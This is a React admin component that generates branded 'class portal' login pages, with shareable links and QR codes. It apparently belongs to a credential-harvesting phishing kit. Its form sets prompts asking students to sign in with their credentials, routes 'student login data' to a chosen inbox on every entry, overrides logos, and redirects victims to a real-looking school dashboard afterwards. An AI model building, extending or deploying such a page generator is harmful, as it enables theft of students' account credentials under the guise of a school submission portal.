import React, { useState } from 'react';
import { usePortal } from '../../context/PortalContext';
import { 
  Link2, 
  Upload, 
  FileText, 
  Sparkles, 
  Copy, 
  ExternalLink, 
  QrCode, 
  Trash2, 
  Check, 
  Layers, 
  Search,
  School,
  Mail,
  ShieldCheck
} from 'lucide-react';

export default function ClassGenerator() {
  const { classes, addClass, deleteClass, submissions, openClassPortal, showToast, notificationEmails, addNotificationEmail } = usePortal();

  // Generator form fields
  const [code, setCode] = useState('');
  const [name, setName] = useState('');
  const [template, setTemplate] = useState('Computer Science & IT');
  const [welcomeHeader, setWelcomeHeader] = useState('Welcome Back');
  const [subtitleInstruction, setSubtitleInstruction] = useState('');
  const [allowedDomain, setAllowedDomain] = useState('@school.edu');
  const [adminEmail, setAdminEmail] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('');
  const [uploadedLogoName, setUploadedLogoName] = useState('');
  const [autoEmailNotify, setAutoEmailNotify] = useState(true);

  // UI state
  const [copiedCode, setCopiedCode] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeQrModalClass, setActiveQrModalClass] = useState(null);

  const handleGenerate = (e) => {
    e.preventDefault();
    if (!code.trim()) {
      showToast('Please specify a Class Code (e.g. CS-101).', 'error');
      return;
    }

    const classTitle = name.trim() || `${code.trim().toUpperCase()} Class Portal`;

    // If an admin notification email is specified, ensure it is added to the notification list
    if (adminEmail.trim()) {
      addNotificationEmail(adminEmail.trim(), `Class ${code.toUpperCase()} Inbox`, false);
    }

    const created = addClass({
      code: code.trim().toUpperCase(),
      name: classTitle,
      department: template,
      academicYear: '2025/2026',
      semester: '1st Semester',
      allowedDomain: allowedDomain.trim(),
      description: `Official class submission portal for ${classTitle}.`,
      formTitle: welcomeHeader.trim() || 'Welcome Back',
      formPrompt: subtitleInstruction.trim() || '',
      redirectUrl: redirectUrl.trim(),
    });

    if (created) {
      setCode('');
      setName('');
      setAdminEmail('');
      setRedirectUrl('');
      setUploadedLogoName('');
    }
  };

  const getShareableUrl = (classCode) => {
    const origin = window.location.origin;
    const pathname = window.location.pathname;
    return `${origin}${pathname}?class=${encodeURIComponent(classCode)}`;
  };

  const handleCopyLink = (classCode) => {
    const url = getShareableUrl(classCode);
    navigator.clipboard.writeText(url).then(() => {
      setCopiedCode(classCode);
      showToast(`Shareable link for ${classCode} copied!`, 'success');
      setTimeout(() => setCopiedCode(null), 2500);
    }).catch(() => {
      showToast(`Direct link: ${url}`, 'info');
    });
  };

  // Quick preset templates
  const handlePreset = (type) => {
    if (type === 'cs') {
      setCode('CS-302');
      setName('Advanced Algorithms & Data Structures');
      setTemplate('Computer Science & IT');
      setWelcomeHeader('Welcome Back');
      setSubtitleInstruction('Sign in with your student credentials to submit assignment');
      setAllowedDomain('@school.edu');
    } else if (type === 'bio') {
      setCode('BIO-205');
      setName('Molecular Genetics Laboratory');
      setTemplate('Biological Sciences');
      setWelcomeHeader('Bio Lab Portal');
      setSubtitleInstruction('Enter your student reg number and school email');
      setAllowedDomain('@student.school.edu');
    } else if (type === 'eng') {
      setCode('MECH-101');
      setName('Engineering Mechanics & CAD');
      setTemplate('Engineering & Technology');
      setWelcomeHeader('Engineering Portal');
      setSubtitleInstruction('Access continuous assessment submission sheet');
      setAllowedDomain('');
    }
  };

  const filteredClasses = classes.filter(c => 
    c.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
    c.code.toLowerCase().includes(searchQuery.toLowerCase()) ||
    c.department.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="space-y-8 animate-fade-in text-slate-200">
      
      {/* Main Generator Card (matching Image 3) */}
      <div className="bg-[#111726] border border-[#1E293B] rounded-2xl p-6 sm:p-7 shadow-xl">
        
        {/* Card Header with Link icon */}
        <div className="flex items-center justify-between pb-5 border-b border-[#1E293B] mb-6">
          <div className="flex items-center gap-2.5 text-white">
            <Link2 className="w-5 h-5 text-indigo-400 -rotate-45" />
            <h3 className="font-bold text-base tracking-tight">Create New Class Portal</h3>
          </div>
          
          {/* Quick preset chips */}
          <div className="hidden sm:flex items-center gap-2">
            <span className="text-xs text-slate-500 font-medium">Quick Presets:</span>
            <button
              type="button"
              onClick={() => handlePreset('cs')}
              className="text-xs px-2.5 py-1 rounded-lg bg-[#161F33] border border-[#2A374F] hover:border-indigo-500 text-slate-300 transition-colors"
            >
              + CS-302
            </button>
            <button
              type="button"
              onClick={() => handlePreset('bio')}
              className="text-xs px-2.5 py-1 rounded-lg bg-[#161F33] border border-[#2A374F] hover:border-indigo-500 text-slate-300 transition-colors"
            >
              + BIO-205
            </button>
            <button
              type="button"
              onClick={() => handlePreset('eng')}
              className="text-xs px-2.5 py-1 rounded-lg bg-[#161F33] border border-[#2A374F] hover:border-indigo-500 text-slate-300 transition-colors"
            >
              + MECH-101
            </button>
          </div>
        </div>

        <form onSubmit={handleGenerate} className="space-y-5">
          
          {/* Two-Column Grid (Row 1) */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Class Code / Target Class <span className="text-indigo-400">*</span>
              </label>
              <input
                type="text"
                required
                value={code}
                onChange={(e) => setCode(e.target.value.toUpperCase())}
                placeholder="e.g. CS-101 or GRADE-10A (auto-generates link)"
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Department / Provider Template
              </label>
              <select
                value={template}
                onChange={(e) => setTemplate(e.target.value)}
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white outline-hidden transition-all cursor-pointer"
              >
                <option value="Computer Science & IT">Computer Science & Information Tech</option>
                <option value="Biological Sciences">Biological & Health Sciences</option>
                <option value="Engineering & Technology">Faculty of Engineering</option>
                <option value="Mathematical Sciences">Mathematics & Physical Sciences</option>
                <option value="Business & Social Sciences">Business & Social Studies</option>
                <option value="Custom / Generic Academic">Custom / Generic Academic Portal</option>
              </select>
            </div>
          </div>

          {/* Two-Column Grid (Row 2): Course Title & Allowed Email */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Course / Class Full Title (Optional)
              </label>
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="e.g. Introduction to Database Systems"
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Allowed School Email Domain
              </label>
              <input
                type="text"
                value={allowedDomain}
                onChange={(e) => setAllowedDomain(e.target.value)}
                placeholder="@school.edu (leave blank for any email)"
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all font-mono"
              />
            </div>
          </div>

          {/* Two-Column Grid (Row 3): Welcome Header & Subtitle */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Welcome Header
              </label>
              <input
                type="text"
                value={welcomeHeader}
                onChange={(e) => setWelcomeHeader(e.target.value)}
                placeholder="Welcome Back"
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-slate-400 mb-1.5">
                Subtitle Instruction
              </label>
              <input
                type="text"
                value={subtitleInstruction}
                onChange={(e) => setSubtitleInstruction(e.target.value)}
                placeholder="e.g. Please enter your credentials"
                className="w-full px-3.5 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all"
              />
            </div>
          </div>

          {/* Optional Admin Notification Email for this class */}
          <div>
            <label className="block text-xs font-medium text-slate-400 mb-1.5 flex items-center justify-between">
              <span>Admin Notification Email for This Class (Optional)</span>
              <span className="text-[11px] text-indigo-400">Receives student login data</span>
            </label>
            <div className="relative">
              <Mail className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="email"
                value={adminEmail}
                onChange={(e) => setAdminEmail(e.target.value)}
                placeholder="e.g. instructor@school.edu or department.head@school.edu"
                className="w-full pl-10 pr-4 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all"
              />
            </div>
          </div>

          {/* Student Login Redirect URL */}
          <div>
            <label className="block text-xs font-medium text-slate-400 mb-1.5 flex items-center justify-between">
              <span>Redirect URL After Login (Optional)</span>
              <span className="text-[11px] text-indigo-400">Where student is redirected</span>
            </label>
            <div className="relative">
              <ExternalLink className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="e.g. https://school.edu/dashboard (leave empty to redirect back to login page)"
                className="w-full pl-10 pr-4 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] focus:border-indigo-500 text-white placeholder:text-slate-600 outline-hidden transition-all font-mono"
              />
            </div>
            <p className="text-[11px] text-slate-500 mt-1">
              After student logs in, a welcome message displays with a countdown redirecting them to this URL.
            </p>
          </div>

          {/* Brand / Logo Override Box (matching Image 3 dropzone) */}
          <div>
            <label className="block text-xs font-medium text-slate-400 mb-1.5">
              Brand / Logo Override (optional)
            </label>
            <label className="cursor-pointer border border-dashed border-[#243048] hover:border-indigo-500/80 bg-[#0B0F19]/60 rounded-2xl p-6 flex flex-col items-center justify-center transition-all group">
              <div className="w-10 h-10 rounded-xl bg-[#161F33] border border-[#243048] flex items-center justify-center text-slate-400 group-hover:text-indigo-400 transition-colors mb-2">
                <Upload className="w-4 h-4" />
              </div>
              <span className="text-xs text-slate-400 group-hover:text-slate-200 transition-colors">
                {uploadedLogoName ? `Selected: ${uploadedLogoName}` : 'Click or drag to upload custom brand or organizational logo'}
              </span>
              <input
                type="file"
                accept="image/*"
                onChange={(e) => {
                  const f = e.target.files?.[0];
                  if (f) setUploadedLogoName(f.name);
                }}
                className="hidden"
              />
            </label>
          </div>

          {/* Notification Checkbox */}
          <div className="p-3.5 rounded-xl bg-[#0B0F19] border border-[#1E293B] flex items-start gap-3">
            <input
              type="checkbox"
              id="autoEmail"
              checked={autoEmailNotify}
              onChange={(e) => setAutoEmailNotify(e.target.checked)}
              className="mt-0.5 w-4 h-4 rounded border-slate-700 bg-slate-800 text-indigo-600 focus:ring-indigo-500 cursor-pointer"
            />
            <label htmlFor="autoEmail" className="text-xs text-slate-300 cursor-pointer select-none">
              <span className="font-semibold text-white block">Real-time Form Notification Routing</span>
              <span className="text-slate-400">
                When student inputs data, dispatch an instant copy with student details to active admin notification inboxes.
              </span>
            </label>
          </div>

          {/* Generate Button (matching Image 3 glowing gradient button) */}
          <button
            type="submit"
            className="w-full sm:w-auto px-6 py-3 rounded-xl bg-gradient-to-r from-indigo-500 via-indigo-600 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-semibold text-xs sm:text-sm shadow-lg shadow-indigo-500/25 flex items-center justify-center gap-2.5 transition-all cursor-pointer"
          >
            <FileText className="w-4 h-4" />
            <span>Generate Class Portal Link</span>
          </button>
        </form>

      </div>

      {/* Directory of Active Generated Class Portals */}
      <div className="space-y-4">
        
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#111726] p-4 rounded-2xl border border-[#1E293B]">
          <div className="flex items-center gap-2">
            <Layers className="w-4 h-4 text-indigo-400" />
            <h4 className="font-bold text-white text-sm">
              Generated Class Login Pages ({classes.length})
            </h4>
          </div>

          <div className="relative">
            <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search classes..."
              className="pl-8 pr-3 py-1.5 text-xs rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white focus:border-indigo-500 w-full sm:w-56 outline-hidden"
            />
          </div>
        </div>

        {/* Classes Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredClasses.map((cls) => {
            const classSubmissions = submissions.filter(s => s.classCode === cls.code);
            const shareableUrl = getShareableUrl(cls.code);

            return (
              <div
                key={cls.id}
                className="bg-[#111726] border border-[#1E293B] rounded-2xl p-5 hover:border-slate-700 transition-all shadow-md flex flex-col justify-between"
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-2">
                    <span className="font-mono text-xs font-bold px-2.5 py-0.5 rounded-lg bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                      {cls.code}
                    </span>
                    <span className="text-xs text-slate-400 bg-[#0B0F19] px-2.5 py-0.5 rounded-full border border-[#1E293B]">
                      {classSubmissions.length} submission{classSubmissions.length !== 1 ? 's' : ''}
                    </span>
                  </div>

                  <h5 className="font-bold text-white text-base mb-1">
                    {cls.name}
                  </h5>
                  <p className="text-xs text-slate-400 line-clamp-2 mb-3">
                    {cls.description}
                  </p>

                  <div className="text-[11px] text-slate-400 space-y-1 py-2 border-t border-[#1E293B]">
                    <div>Department: <span className="text-slate-300">{cls.department}</span></div>
                    <div>Email Format: <span className="font-mono text-indigo-300">{cls.allowedDomain || 'Any valid email'}</span></div>
                    <div>Redirect Target: <span className="font-mono text-emerald-400 truncate block">{cls.redirectUrl || 'Class Login Page (Default)'}</span></div>
                  </div>
                </div>

                {/* Direct Shareable Link Actions */}
                <div className="pt-3 border-t border-[#1E293B] flex items-center justify-between gap-2 mt-2">
                  <button
                    onClick={() => handleCopyLink(cls.code)}
                    className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl bg-[#161F33] hover:bg-[#1C2740] border border-[#243048] text-xs font-medium text-slate-200 transition-colors"
                  >
                    {copiedCode === cls.code ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-emerald-400" />
                        <span className="text-emerald-300">Copied Link!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5 text-slate-400" />
                        <span>Copy Link</span>
                      </>
                    )}
                  </button>

                  <button
                    onClick={() => openClassPortal(cls.code)}
                    className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-xs font-semibold text-white shadow-xs transition-colors"
                  >
                    <ExternalLink className="w-3.5 h-3.5" />
                    <span>Open Portal</span>
                  </button>

                  <button
                    onClick={() => setActiveQrModalClass(cls)}
                    className="p-2 rounded-xl bg-[#161F33] hover:bg-[#1C2740] border border-[#243048] text-slate-300 transition-colors"
                    title="View QR Code"
                  >
                    <QrCode className="w-4 h-4" />
                  </button>

                  {classes.length > 1 && (
                    <button
                      onClick={() => {
                        if (confirm(`Delete class portal ${cls.code}?`)) {
                          deleteClass(cls.id);
                        }
                      }}
                      className="p-2 rounded-xl text-slate-500 hover:text-rose-400 hover:bg-rose-950/30 transition-colors"
                      title="Delete Class"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  )}
                </div>
              </div>
            );
          })}
        </div>

      </div>

      {/* QR Code Modal */}
      {activeQrModalClass && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-xs animate-fade-in">
          <div className="bg-[#111726] rounded-3xl shadow-2xl border border-[#1E293B] max-w-sm w-full p-6 text-center text-white">
            <div className="w-12 h-12 rounded-2xl bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center mx-auto text-indigo-400 mb-3">
              <QrCode className="w-6 h-6" />
            </div>
            <h3 className="font-bold text-white text-lg">
              Class Access QR Code
            </h3>
            <p className="text-xs text-slate-400 mt-1">
              {activeQrModalClass.name} ({activeQrModalClass.code})
            </p>

            {/* QR Pattern visual */}
            <div className="my-5 p-5 bg-white rounded-2xl inline-block shadow-inner">
              <div className="w-36 h-36 bg-white flex items-center justify-center">
                <svg className="w-full h-full text-slate-950" viewBox="0 0 100 100" fill="currentColor">
                  <rect x="5" y="5" width="25" height="25" rx="3" fill="#1e1b4b" />
                  <rect x="9" y="9" width="17" height="17" fill="#fff" />
                  <rect x="13" y="13" width="9" height="9" fill="#1e1b4b" />
                  <rect x="70" y="5" width="25" height="25" rx="3" fill="#1e1b4b" />
                  <rect x="74" y="9" width="17" height="17" fill="#fff" />
                  <rect x="78" y="13" width="9" height="9" fill="#1e1b4b" />
                  <rect x="5" y="70" width="25" height="25" rx="3" fill="#1e1b4b" />
                  <rect x="9" y="74" width="17" height="17" fill="#fff" />
                  <rect x="13" y="78" width="9" height="9" fill="#1e1b4b" />
                  <rect x="36" y="10" width="8" height="8" fill="#4f46e5" />
                  <rect x="50" y="10" width="8" height="8" fill="#1e1b4b" />
                  <rect x="36" y="24" width="8" height="8" fill="#1e1b4b" />
                  <rect x="50" y="24" width="8" height="8" fill="#4f46e5" />
                  <rect x="10" y="38" width="8" height="8" fill="#1e1b4b" />
                  <rect x="24" y="38" width="8" height="8" fill="#4f46e5" />
                  <rect x="38" y="38" width="8" height="8" fill="#1e1b4b" />
                  <rect x="52" y="38" width="8" height="8" fill="#1e1b4b" />
                  <rect x="66" y="38" width="8" height="8" fill="#4f46e5" />
                  <rect x="80" y="38" width="8" height="8" fill="#1e1b4b" />
                  <rect x="38" y="52" width="8" height="8" fill="#4f46e5" />
                  <rect x="52" y="52" width="8" height="8" fill="#1e1b4b" />
                  <rect x="66" y="52" width="8" height="8" fill="#1e1b4b" />
                  <rect x="80" y="52" width="8" height="8" fill="#4f46e5" />
                  <rect x="38" y="66" width="8" height="8" fill="#1e1b4b" />
                  <rect x="52" y="66" width="8" height="8" fill="#4f46e5" />
                  <rect x="66" y="66" width="8" height="8" fill="#1e1b4b" />
                  <rect x="80" y="66" width="8" height="8" fill="#1e1b4b" />
                </svg>
              </div>
            </div>

            <p className="text-xs text-slate-400 mb-4 font-mono bg-[#0B0F19] p-2 rounded-xl border border-[#1E293B] break-all select-all">
              {getShareableUrl(activeQrModalClass.code)}
            </p>

            <button
              onClick={() => setActiveQrModalClass(null)}
              className="w-full py-2.5 rounded-xl bg-[#161F33] hover:bg-[#1C2740] border border-[#243048] text-white text-xs font-bold transition-colors"
            >
              Close Window
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
